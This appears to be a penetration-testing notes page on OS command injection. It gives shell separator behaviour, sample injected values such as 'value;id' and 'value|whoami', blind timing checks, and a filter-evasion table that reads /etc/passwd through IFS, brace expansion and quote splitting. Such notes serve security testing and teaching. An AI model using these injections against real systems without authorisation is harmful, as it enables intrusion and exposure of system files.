# OS command injection

[Home](../README.md) · [Web enumeration](Enumeration.md) · [File attacks](File-Attacks.md)

## Confirm the execution context

Command injection occurs when input changes a system command or its arguments. Start with a small identity command and a control request. Determine whether the application uses a shell, which shell it uses, and whether output is reflected.

| Construct | POSIX shell | Windows CMD | Windows PowerShell |
|---|---|---|---|
| `;` | Command separator | Not a general separator | Command separator |
| `&` | Background operator | Command separator | Invocation operator; semantics differ |
| `&&` / `\|\|` | Conditional chaining | Conditional chaining | Supported in PowerShell 7; not Windows PowerShell 5.1 |
| Pipe | Pass stdout to another command | Pipeline | Object pipeline, with native-command conversion |
| Newline | Often a separator | Depends on parsing/input | Often a separator |
| `$()` / backticks | Command substitution | Not POSIX substitution | `$()` is a subexpression; backtick is an escape |

Representative input values, adapted to the actual parameter:

```text
value;id
value&&whoami
value|whoami
value$(id)
```

If the application invokes a program directly without a shell, shell metacharacters may be inert while argument injection is still possible. Look for input interpreted as a flag and consult that program's behavior.

## Blind execution

For a POSIX shell, compare `;sleep 3` with a no-delay control. Repeat to distinguish network jitter. For Windows, choose syntax appropriate to CMD or PowerShell. A controlled callback or a file in a known writable web path can provide another proof when network access or file retrieval is available.

Do not troubleshoot a reverse shell before proving command execution, callback routing, interpreter availability and listener compatibility.

## Filter and encoding behavior

These are Bash/POSIX examples unless stated otherwise:

| Restricted character or word | Candidate | Limit |
|---|---|---|
| Space | `cat</etc/passwd` | Shell must support redirection; reads that file into `cat`. |
| Space | `cat${IFS}/etc/passwd` | Shell expansion and current `IFS` must produce the expected separator. |
| Space | `{cat,/etc/passwd}` | Bash brace expansion; not portable `/bin/sh` syntax. |
| Slash | `${HOME:0:1}` | Bash substring expansion; value must start with `/`. |
| Literal command word | `w'h'o'am'i`, `w"h"o"am"i`, `w\ho\am\i` | Shell concatenation/escape semantics must apply. |
| Literal substring | `v=/e00tc/pa00sswd;cat ${v//00/}` | Bash substitution; depends on assignments/separators being accepted. |
| Whitespace/newline encoding | `%20`, `%09`, `%0A` | Only useful where the application decodes them before execution. |

The source `${cat,/etc/passwd}` spelling is incorrect for Bash brace expansion; the corrected form is above. `who$@ami` depends on positional arguments and should not be assumed stable. CMD caret obfuscation and `%VARIABLE:~start,length%` slicing are CMD-specific; character positions vary with the environment. PowerShell wildcard paths are also environment-specific.

## Quoting and output

Track each parsing layer: HTTP encoding → application string → shell → child program. A working console command may need different quoting inside a JSON value, URL or `cmd.exe /c` string. Base64 can simplify transport but does not create an execution primitive or guarantee evasion.

Use `2>&1` only in a compatible shell when stderr is needed. Redirection to `/var/www/html/output.txt` requires the actual web path and write permission. Record a minimal successful command before expanding the payload.
